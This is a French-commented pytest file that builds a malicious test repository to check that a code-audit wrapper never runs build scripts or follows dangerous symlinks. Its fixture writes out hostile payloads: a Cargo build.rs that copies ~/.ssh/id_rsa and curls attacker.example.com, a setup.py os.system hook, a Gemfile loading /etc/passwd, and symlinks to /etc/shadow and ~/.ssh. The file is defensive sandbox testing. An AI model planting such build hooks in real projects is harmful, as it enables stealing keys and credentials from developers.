"""Section L — Test attaque réelle (tests #158-164 de TESTS.md).

Repos malveillants (build.rs / Gemfile / setup.py / symlinks dangereux)
contre la stack. Vérifie qu'aucun fichier `PWNED-*` n'est créé. Test
dynamique : un seul audit-code par fixture session, puis multiples
assertions sur les artefacts.
"""
from __future__ import annotations

import os
import subprocess
from pathlib import Path

import pytest

from conftest import BIN_DIR, run_wrapper


# Marqueurs PWNED qu'on s'attend à NE PAS trouver après l'audit
PWNED_RCE = Path("/tmp/PWNED-rce.txt")
PWNED_SETUP = Path("/tmp/PWNED-setup.txt")
PWNED_LEAK = Path("/tmp/PWNED-leak.txt")
PWNED_PASSWD = Path("/tmp/PWNED-passwd.txt")


def _build_evil_repo(repo: Path) -> None:
    """Crée un repo avec tous les vecteurs d'attaque."""
    repo.mkdir(parents=True, exist_ok=True)
    # Vecteur 1 : build.rs Cargo qui cat ~/.ssh/id_rsa
    (repo / "Cargo.toml").write_text(
        '[package]\nname = "evil"\nversion = "0.1.0"\nedition = "2021"\n'
        '[dependencies]\ntime = "0.1.43"\n'
    )
    (repo / "Cargo.lock").write_text(
        'version = 3\n[[package]]\nname = "evil"\nversion = "0.1.0"\n'
        '[[package]]\nname = "time"\nversion = "0.1.43"\n'
        'source = "registry+https://github.com/rust-lang/crates.io-index"\n'
        'checksum = "ca8a50ef2360fbd1eeb0ecd46795a87a19024eb4b53c5dc916ca1fd95fe62438"\n'
    )
    (repo / "build.rs").write_text(
        'fn main() {\n'
        '    let _ = std::process::Command::new("sh").arg("-c")\n'
        '        .arg("cat ~/.ssh/id_rsa > /tmp/PWNED-rce.txt; '
        'curl http://attacker.example.com/leak > /tmp/PWNED-leak.txt; '
        'touch /tmp/PWNED-rce.txt").status();\n'
        '}\n'
    )
    (repo / "src").mkdir()
    (repo / "src" / "main.rs").write_text("fn main() {}\n")

    # Vecteur 2 : Gemfile qui load /etc/passwd
    (repo / "Gemfile").write_text(
        'source "https://rubygems.org"\n'
        'load File.expand_path("/etc/passwd")\n'
        'gem "rails"\n'
    )
    (repo / "Gemfile.lock").write_text(
        "GEM\n  specs:\n    rails (4.0.0)\nDEPENDENCIES\n  rails\n"
    )

    # Vecteur 3 : setup.py qui touch /tmp/PWNED-setup.txt
    (repo / "setup.py").write_text(
        'from setuptools import setup\n'
        'import os\n'
        'os.system("touch /tmp/PWNED-setup.txt")\n'
        'setup(name="evil", version="0.1")\n'
    )

    # Vecteur 4 : Symlinks vers /etc/shadow et ~/.ssh
    try:
        (repo / "shadow_link").symlink_to("/etc/shadow")
    except OSError:
        pass
    try:
        (repo / "ssh_link").symlink_to(str(Path.home() / ".ssh"))
    except OSError:
        pass


def _cleanup_pwned_markers() -> None:
    """Supprime les marqueurs PWNED si présents avant un test."""
    for p in (PWNED_RCE, PWNED_SETUP, PWNED_LEAK, PWNED_PASSWD):
        if p.exists():
            p.unlink()


@pytest.fixture(scope="session")
def evil_audit(tmp_path_factory) -> dict:
    """Lance UN audit-code sur un repo malveillant et retourne les artefacts.

    Cleanup PWNED markers AVANT et APRÈS pour pas polluer le système.
    """
    _cleanup_pwned_markers()
    repo = tmp_path_factory.mktemp("evil-L") / "repo"
    _build_evil_repo(repo)
    p = run_wrapper("client-audit-code", str(repo), timeout=180)
    out = p.stdout + p.stderr
    log_dirs = sorted((Path.home() / "audit-logs" / repo.name).glob("*"))
    yield {
        "audit_terminé": "AUDIT TERMINÉ" in out,
        "log_dir": log_dirs[-1] if log_dirs else Path("/dev/null"),
        "stdout": p.stdout,
        "stderr": p.stderr,
        "returncode": p.returncode,
        "repo": repo,
    }
    _cleanup_pwned_markers()


def test_158_cargo_build_rs_rce_blocked(evil_audit: dict) -> None:
    """TESTS.md #158 — build.rs malveillant (cat id_rsa) ne crée pas /tmp/PWNED-rce.txt."""
    assert evil_audit["audit_terminé"], "audit pas terminé"
    assert not PWNED_RCE.exists(), \
        f"PWNED — /tmp/PWNED-rce.txt CRÉÉ ! build.rs a tourné !"


def test_159_cargo_build_rs_curl_leak_blocked(evil_audit: dict) -> None:
    """TESTS.md #159 — build.rs `curl attacker` ne fuit pas (PWNED-leak.txt)."""
    assert not PWNED_LEAK.exists(), \
        "PWNED — /tmp/PWNED-leak.txt créé ! curl attacker.example.com a marché !"


def test_160_cargo_build_rs_touch_blocked(evil_audit: dict) -> None:
    """TESTS.md #160 — `touch /tmp/PWNED-rce.txt` dans build.rs n'a pas tourné."""
    # Même fichier que test_158 — vérifie l'absence après audit
    assert not PWNED_RCE.exists(), "PWNED — /tmp/PWNED-rce.txt présent (touch a tourné)"


def test_161_gemfile_load_etc_passwd_blocked(evil_audit: dict) -> None:
    """TESTS.md #161 — Gemfile `load /etc/passwd` n'a pas eu d'effet (audit-passive)."""
    # Pour que le load ait un effet, il faudrait que bundler-audit/brakeman l'évalue.
    # Nos outils sont passifs (parse seulement) → 0 PWN attendu.
    assert not PWNED_PASSWD.exists(), \
        "PWNED — /tmp/PWNED-passwd.txt créé (bundler a évalué le Gemfile)"
    # Vérification : bundler-audit a quand même produit un .out (analyse passive OK)
    log_dir = evil_audit["log_dir"]
    if log_dir.is_dir():
        assert (log_dir / "bundler-audit.out").is_file() or (log_dir / "trivy-deps.out").is_file(), \
            "bundler-audit/trivy-deps n'a pas tourné sur Gemfile evil"


def test_162_setup_py_os_system_blocked(evil_audit: dict) -> None:
    """TESTS.md #162 — setup.py `os.system("touch /tmp/PWNED-setup.txt")` n'a pas tourné."""
    assert not PWNED_SETUP.exists(), \
        "PWNED — /tmp/PWNED-setup.txt créé ! pip a exécuté setup.py !"


def test_163_symlink_etc_shadow_excluded(evil_audit: dict) -> None:
    """TESTS.md #163 — symlink `/etc/shadow` exclu par rsync --safe-links."""
    log_dir = evil_audit["log_dir"]
    if not log_dir.is_dir():
        pytest.skip("log_dir absent, audit a peut-être skippé")
    # Le wrapper a copié src dans /tmp/audit-* via rsync --safe-links → shadow_link doit pas être suivi
    audit_workdirs = list(Path("/tmp").glob("audit-*"))
    # Chercher un éventuel shadow_link dans les workdirs
    for wd in audit_workdirs:
        for f in wd.rglob("shadow_link"):
            # Si présent, doit être un fichier vide (rsync n'a pas suivi le lien)
            if f.is_symlink():
                target = os.readlink(str(f))
                assert "/etc/shadow" not in target or not f.is_file(), \
                    f"PWNED — symlink /etc/shadow non protégé: {f}"


def test_164_symlink_user_ssh_excluded(evil_audit: dict) -> None:
    """TESTS.md #164 — symlink `~/.ssh` exclu par rsync --safe-links."""
    log_dir = evil_audit["log_dir"]
    if not log_dir.is_dir():
        pytest.skip("log_dir absent")
    # Aucun .out ne doit contenir le contenu de ~/.ssh/id_rsa
    rsa_marker = "BEGIN OPENSSH PRIVATE KEY"
    for f in log_dir.glob("*.out"):
        content = f.read_text(errors="ignore")
        assert rsa_marker not in content, \
            f"PWNED — clé SSH leakée dans {f.name} !"
